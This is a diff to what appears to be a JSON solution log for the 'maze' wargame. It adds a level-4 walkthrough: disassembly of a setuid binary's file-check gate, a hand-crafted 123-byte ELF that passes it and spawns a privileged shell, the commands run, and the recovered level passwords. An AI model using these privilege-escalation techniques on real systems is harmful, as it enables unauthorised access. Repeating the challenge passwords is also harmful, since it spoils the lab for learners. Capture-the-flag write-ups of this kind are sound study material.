@@ -107,6 +107,71 @@
     }
    ],
    "note": "maze3 is a hand-written asm stub (static, 163 B of text). The argc!=2 path mprotects the text page RWX, XOR-decrypts 56 dwords at 0x804906b with 0x12345678 and executes them: the payload checks argv[1][0..3] == de c0 37 13 (0x1337c0de little-endian), setreuid(15004,15004)=maze4 and execve(\"/bin//sh\"). Running /maze/maze3 with that argument gives a shell as maze4 (uid=15004, gid stays 15003); password MB583SjyFZ read live and verified by ssh login as maze4. Recording: recordings/maze/L3.cast."
+  },
+  {
+   "lvl": 4,
+   "pw": "A3846ZPJuH",
+   "user": "maze5",
+   "steps": [
+    {
+     "cmd": "ls -la /maze/maze4; md5sum /maze/maze4",
+     "out": [
+      "-r-sr-x--- 1 maze5 maze4 16392 Oct 25 13:39 /maze/maze4",
+      "a430203e2d1d77addc79387272e499b4  /maze/maze4"
+     ]
+    },
+    {
+     "cmd": "objdump -d -M intel /maze/maze4 (main at 0x8049216, 366 bytes)",
+     "out": [
+      "argc!=2 -> usage+exit; open(argv[1]); stat(argv[1], &st)",
+      "read(fd, bufA, 52); lseek(fd, *(int*)(bufA+28), SEEK_SET); read(fd, bufB, 32)",
+      "if (*(int*)(bufB+12) == (u8)bufA[7] * (u8)bufA[8] && st.st_size <= 0x7b)",
+      "  puts(\"valid file, executing\"); execv(argv[1], argv);",
+      "else fwrite(\"file not executed\\n\", stderr)"
+     ]
+    },
+    {
+     "cmd": "gdb: x/2xb $ebp-0x31; x/2xb $ebp-0x30; x/1dw $ebp-0xa4; x/1dw $ebp-0x1c",
+     "out": [
+      "[ebp-0x31] = bufA+7 = file byte 7 (factor 1)",
+      "[ebp-0x30] = bufA+8 = file byte 8 (factor 2)",
+      "[ebp-0xa4] = bufB+12 = compared dword (second-read window)",
+      "[ebp-0x1c] = bufA+28 = lseek offset = dword(file[28..31]) \u2014 NOT st_size",
+      "size check reads [ebp-0x64] = st_size <= 123"
+     ]
+    },
+    {
+     "cmd": "gate replay on any file: dword(file[off+12..off+15]) == file[7]*file[8], off = dword(file[28..31])",
+     "out": [
+      "ELF: file[7..8] = EI_OSABI, EI_ABIVERSION = 0,0 -> product 0",
+      "e_phoff = 52 -> off = 52; read2 = bytes 52..83 = phdr0",
+      "phdr0+12 = p_paddr -> set p_paddr = 0 (kernel ignores it): compare 0 == 0 PASS"
+     ]
+    },
+    {
+     "cmd": "python3 tinel.py   # 52-byte ehdr + 32-byte phdr + 26-byte code = 123 bytes",
+     "out": [
+      "wrote 123 bytes",
+      "Type: EXEC (Executable file); Entry point 0x8048054",
+      "LOAD 0x000000 0x08048000 0x00000000 0x0007b 0x0007b R E 0x1000"
+     ]
+    },
+    {
+     "cmd": "cp /bin/sh ./sh; chmod 755 tiny sh; echo id | /maze/maze4 tiny",
+     "out": [
+      "valid file, executing",
+      "uid=15004(maze4) gid=15004(maze4) euid=15005(maze5) groups=15004(maze4)"
+     ]
+    },
+    {
+     "cmd": "echo \"cat /etc/maze_pass/maze5\" | /maze/maze4 tiny",
+     "out": [
+      "valid file, executing",
+      "A3846ZPJuH"
+     ]
+    }
+   ],
+   "note": "maze4 stat-then-exec gate: read(fd,bufA,52); lseek(fd, *(int*)(bufA+28)) \u2014 the offset comes from the file's own bytes 28..31, NOT st_size; read(fd,bufB,32); passes iff dword(bufB+12) == bufA[7]*bufA[8] and st_size <= 123, then execv(argv[1]). For a script this would be enough \u2014 but /tmp is tmpfs nosuid (setuid bit stripped) and dash drops the euid anyway. Winner: a hand-built 123-byte i386 ELF (tinel.py): bytes 7,8 = EI_OSABI,EI_ABIVERSION = 0,0 so the product is 0; e_phoff = 52 is the lseek offset; phdr0.p_paddr = 0 (kernel-ignored) makes the compare 0 == 0; e_ident[9..14] hides the strings \"sh\\0-p\\0\"; the 26-byte stub at file offset 84 execve(\"sh\", {\"sh\",\"-p\",0}, 0) \u2014 a dash copy in the cwd, -p keeps euid. maze4's setuid gives euid=maze5 (visible: uid=15004 euid=15005), dash -p preserves it, cat prints A3846ZPJuH. Password verified by ssh login as maze5 (uid=15005). Recording: recordings/maze/L4.cast. NOTE: /tmp is nosuid on this lab \u2014 use /run/screen (root ext4) for setuid work."
   }
  ],
  "goals": {
